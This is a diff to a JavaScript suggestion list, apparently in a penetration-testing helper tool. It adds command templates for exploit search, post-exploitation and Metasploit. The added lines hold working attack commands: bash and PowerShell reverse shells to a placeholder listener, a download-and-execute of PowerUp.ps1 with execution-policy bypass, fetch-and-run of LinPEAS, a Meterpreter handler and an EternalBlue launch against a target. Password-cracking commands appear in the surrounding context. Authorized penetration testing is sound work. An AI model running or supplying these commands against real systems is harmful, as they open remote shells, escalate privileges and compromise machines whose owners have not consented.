@@ -51,6 +51,16 @@ export const SUGGESTIONS = [
     ]
   },
   {
+    category: 'Exploit Research',
+    items: [
+      { label: 'SearchSploit SMB', command: 'searchsploit smb' },
+      { label: 'SearchSploit Apache', command: 'searchsploit apache 2.4' },
+      { label: 'SearchSploit CVE', command: 'searchsploit CVE-2024-0000' },
+      { label: 'SearchSploit Mirror', command: 'searchsploit -m 00000' },
+      { label: 'Exploit-DB', command: 'Visit https://www.exploit-db.com' }
+    ]
+  },
+  {
     category: 'Web Vulnerability Scanning',
     items: [
       { label: 'Nikto Scan', command: 'nikto -h http://{target}' },
@@ -87,6 +97,24 @@ export const SUGGESTIONS = [
       { label: 'John SSH Key', command: 'ssh2john id_rsa > id_rsa.hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash' },
       { label: 'John ZIP', command: 'zip2john {file}.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash' },
       { label: 'Identify Hash', command: 'hash-identifier {hash}' }
+    ]
+  },
+  {
+    category: 'Post-Exploitation',
+    items: [
+      { label: 'Reverse Shell Bash', command: 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' },
+      { label: 'Reverse Shell PowerShell', command: 'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\\\"{lhost}\\\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\\"PS \\\" + (pwd).Path + \\\"> \\\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"' },
+      { label: 'LinPEAS', command: 'curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh' },
+      { label: 'WinPEAS', command: 'powershell -c \"iwr -UseBasicParsing https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winpeas.exe\"' },
+      { label: 'PowerUp', command: 'powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\\\"); Invoke-AllChecks\"' }
+    ]
+  },
+  {
+    category: 'Metasploit Templates',
+    items: [
+      { label: 'msfconsole Search', command: 'msfconsole -q -x \"search type:exploit name:smb; exit\"' },
+      { label: 'msfconsole Handler', command: 'msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run\"' },
+      { label: 'msfconsole SMB', command: 'msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run\"' }
     ]
   }
 ];
